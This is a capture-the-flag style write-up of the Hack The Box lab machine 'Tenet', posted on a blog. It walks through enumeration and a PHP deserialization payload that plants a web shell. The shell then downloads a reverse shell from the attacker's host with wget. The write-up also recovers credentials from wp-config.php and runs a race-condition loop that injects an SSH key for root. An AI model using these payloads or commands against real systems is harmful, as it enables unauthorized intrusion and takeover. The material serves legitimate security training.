---
title:     "Hack The Box - Tenet"
tags: [HackTheBox,Linux,Medium,CVE,ActiveDirectory]
layout: post
categories: HackTheBox-Writeups
---

![](/images/HTB/Tenet/tenet.png)

# Introduction

Tenet is a medium rated box featuring a PHP deserialization attack and a race for root. This box focuses on a couple of scripts, figuring out their weaknesses, and exploiting them. The box name is taken from a 'Sator Square' and is a theme throughout the box. Let's get started!

# Initial Enumeration

## Nmap scan
```
# Nmap 7.91 scan initiated Mon May 24 19:21:06 2021 as: nmap -T3 -Pn -O -p T:22,80 -sV --script=default,http-vuln-cve2010-0738.nse,http-vuln-cve2011-3192.nse,http-vuln-cve2014-2126.nse,http-vuln-cve2014-2127.nse,http-vuln-cve2014-2128.nse,http-vuln-cve2014-2129.nse,http-vuln-cve2015-1635.nse,http-vuln-cve2017-1001000.nse -oN /storage/HackTheBox/Tenet/nmap/vuln_10.10.10.223.nmap 10.10.10.223
Nmap scan report for 10.10.10.223
Host is up (0.0079s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 24 19:21:16 2021 -- 1 IP address (1 host up) scanned in 10.84 seconds
```

## HTTP

Our Nmap scan comes back with only SSH and HTTP open. Realistically this means we are finding some exploit on this web page somewhere. Navigating to `http://10.10.10.223/` brings up a default Ubuntu Apache2 installation page. There isn't much to see here but from boxes in the past there is a chance that the real website is at `http://tenet.htb` so lets get that added to our hosts file and try again.

Success! We now find a Wordpress blog with a few posts. A quick scan with wpscan (`wpscan --url http://tenet.htb --enumerate u,ap,tt,t`) doesnt show us much but we come away with two usernames, protagonist and neil. 

![](/images/HTB/Tenet/wordpress_users.png)

Looking closer at the blog, the first post mentions some new time management software called 'rotas' (Sator Square reference #1) but otherwise does not tell us much. However the second post is far more interesting. This post is talking about a data migration and has a very interesting comment from neil about a `sator.php` file and a backup. 

![](/images/HTB/Tenet/neil_comment.png)

We can guess that this 'sator.php' file is the target we are looking for, and likely this 'backup' too. Navigating to `http://tenet.htb/sator.php` did not turn up anything. At this point I started dirbusting (making sure that my wordlist had 'sator' in it) for files with the PHP extension, as well as bak, bk, bkp, and backup since you never know what extension may have been used. I got exactly nowhere. Confused and slightly annoyed I took a break. After some time away it hit me that the first blog post was talking about a migration, and that maybe that default Apache2 page was actually the new migration site and not just a default being displayed trying to point us at http://tenet.htb. Navigating back to http://10.10.10.223/sator.php now returns a result!

![](/images/HTB/Tenet/sator_php.png)

Now that we know we are on the right track let's look for this backup. I wasn't sure if the post was referring to a backup of sator.php or some other backup but I quickly found the file as `sator.php.bak` and downloaded it.


## Sator.php.bak

![](/images/HTB/Tenet/sator_backup.png)

We see that we have a pretty small script but a few things stand out. For one we see `//	echo 'Gotta get this working properly...';` in the `__destruct` function, and the other thing that stood out to me is the `unserialize($input)`. I had heard of deserialization attacks and found a great article (linked below) explaining how they work. After looking into how it all works I came up with the following hypothesis:

Thanks to the `file_put_contents` line, if we are able to control the `$user_file` variable and the `$data` variable we should be able to create our own PHP file on the server that we can use for command execution. After some trial and error I came up with the following command:

`O:14:"DatabaseExport":2:{s:9:"user_file";s:8:"test.php";s:4:"data";s:28:"<?php system($_GET["cmd"])?>";}`

## RCE / PHP shell

Time to send this to the sever. Let's load up burp to make our life easier. We need to point this to sator.php with the query string of 'arepo' (another Sator Square reference!) since `$input = $_GET['arepo']`. As a last step we need to URL encode the string before sending it. Once that is done we are good to go.

![](/images/HTB/Tenet/burp_serialize.png)

We see that we get a second 'database updated' line which is good news. If we try to navigate to http://10.10.10.223/test.php we get a blank screen instead of a 404 page so it looks like we were successful! Let's check with burp.

![](/images/HTB/Tenet/rce.png)

Success! Time to get a shell back. Let's upload a full PHP reverse shell with wget. Modifying the standard pentestmonkey reverse shell and sending it with `GET /test.php?cmd=wget+http://10.10.14.16:8000/cypher.php HTTP/1.1` we can see that our webserver is accessed. All we need to do now is navigate to http://10.10.10.223/cypher.php to get our callback.

![](/images/HTB/Tenet/shell.png)


# Getting user

As always before pulling over linPEAS I like to do some quick manual enumeration to see what I can find. Heading back to /var/www/html/wordpress we see we have a wp-config.php file. Let's have a look at the contents.

![](/images/HTB/Tenet/wp_config.png)

We see a username of `neil` and a password of `Opera2112` (yes, another Sator Square reference for those playing along) that we can attempt to login with. Checking SSH and finding that these credentials work we can clean up our PHP files and move over to SSH.

# Getting root

Again before running linPEAS lets do some basic enumeration. Checking `sudo -l` shows we can run a script called 'enableSSH.sh' using sudo without a password so lets see what that is.

![](/images/HTB/Tenet/enablessh.png)

Looking over this script we see that when it is run it adds an SSH key to the root authorized_keys file. The big giveaway (other than the fact that we can run this with sudo) that this is going to be exploitable is that it is creating a file with `umask 110`, or rw-rw-rw-.

Doing a bit of research we see that the command `mktemp -u` is considered unsafe, the reason being that it is possible for two processes to modify the same file which is exactly what we are going to do. The issue is that mktemp is going to generate the filename 'ssh-XXXXXXXX', but the X's are going to be random characters. After thinking about this for a bit, I figured I might be able to have a script running 'find' forever, grepping for SSH, and injecting my SSH key into the file. I imagine there was a better way of doing this, but in the end I came up with this monstrosity:

```
while true; do for FILE in $(find /tmp 2>/dev/null| grep ssh); do echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC6R8gMzppmUMYmswy3IFAFqWGG4X1qLlwB+ym88iAW+arD4s5PrH0TEy7DboiwbWRSQmY0hjppMDpzW1mrOroSz4XG88pFto/7wCAB3PxPukiWo+cgh/kK3j89HXg30NSeDtv/oAY6Kkk7uioB4rhqpiGmIjOHro8yuIf5a2wvVZaH9+uQ+vM0IkEbrdYXSygUc+rGcFu0w3nG9AvEqLdls4oZANEfxS/CxrsDVwOgscWncAiBDO06ThAkyH+0CKITN01Jmdp8YAWw8UjR257zHFMdRaW6n1GEK4jYfJ71M7+10KvKudwn5/3BYxC9YEpR2wrGm5zdcA1wIDxxl22ziLwrcUMumxLCwH5OFBOR1HQ52ePWUjMwibJ+EB1/fKZipAushqBQyFPeugIR2b9DmrVmIykBl2GV6sifWtb/pUDqrnnPM4gBTCN5KCCdGNzBOiIUb5IO9XKtdogyVQgBXaVCO1jhs5zRWZlg0sR43WgK7tT7zPDTPEU/9CTrHPU= root@kali" > $FILE;done;done
```

While it took a few attempts I was eventually successful!

![](/images/HTB/Tenet/root.png)

And there we have it. Boom.


# References 

- [Exploiting PHP deserialization. Intro to PHP object injection… \| by Vickie Li \| The Startup \| Medium](https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a)
- [php-reverse-shell/php-reverse-shell.php at master · pentestmonkey/php-reverse-shell · GitHub](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)